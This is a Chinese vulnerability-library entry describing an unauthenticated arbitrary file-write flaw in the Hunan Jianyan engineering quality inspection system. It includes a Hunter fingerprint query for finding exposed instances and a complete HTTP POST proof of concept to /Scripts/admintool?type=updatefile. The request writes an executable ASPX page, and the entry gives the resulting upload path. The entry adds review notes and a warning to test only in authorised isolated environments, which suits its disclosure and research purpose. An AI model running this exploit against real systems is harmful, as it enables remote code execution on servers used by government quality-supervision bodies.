---
source: "wy876 漏洞文库"
title: "湖南建研工程质量检测系统 admintool updatefile任意文件写入"
product: "湖南建研工程质量检测系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；Scripts目录写权限及ASPX解析"
prerequisites: "无Cookie请求，鉴权未知"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/vltdwq5lzwibm1z7"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%BB%BA%E7%A0%94%E4%BF%A1%E6%81%AF/%E6%B9%96%E5%8D%97%E5%BB%BA%E7%A0%94%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9Fupdatefile%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
hunter: "web.body=\"/Content/Theme/Standard/webSite/login.css\""
id: "vw-85de8498031fb418d8109a16"
entity_id: "ve-85de8498031fb418d8109a16"
schema_version: "1"
previous_fofa_unverified: "web.body="
---

# 湖南建研工程质量检测系统 admintool updatefile任意文件写入

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：湖南建研工程质量检测系统；admintool updatefile任意文件写入
- 版本、配置及部署条件：版本未知；Scripts目录写权限及ASPX解析
- 认证与权限前提：无Cookie请求，鉴权未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 实为fileContent参数写文件非multipart上传，应规范漏洞类型
- ASPX乘法明确但缺GET输出结果，不能单请求认RCE已证
- 固定文件名可能覆盖且无清理；补版本/修复和路径限制

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
湖南建研质量监测系统由相关政府质量监督机构、参建单位等共同参与，根据各自的职责，上网操作相应的模块，实现工程质量监督业务的统一管理。该系统存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 湖南建研工程质量检测系统

## 三、资产测绘
+ hunter`web.body="/Content/Theme/Standard/webSite/login.css"`
+ 特征


## 四、漏洞复现
```http
POST /Scripts/admintool?type=updatefile HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:92.0) Gecko/20100101 Firefox/92.0
Content-Length: 90
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

filePath=enelxghy.aspx&fileContent=<%@ Page Language="C#"%><% Response.Write(1234*1234);%>
```

> 请求长度说明：原资料 Content-Length 为 90；保留原始标头；其数值未据实际请求体重新计算或验证。


上传文件位置

```plain
/Scripts/enelxghy.aspx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vltdwq5lzwibm1z7>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
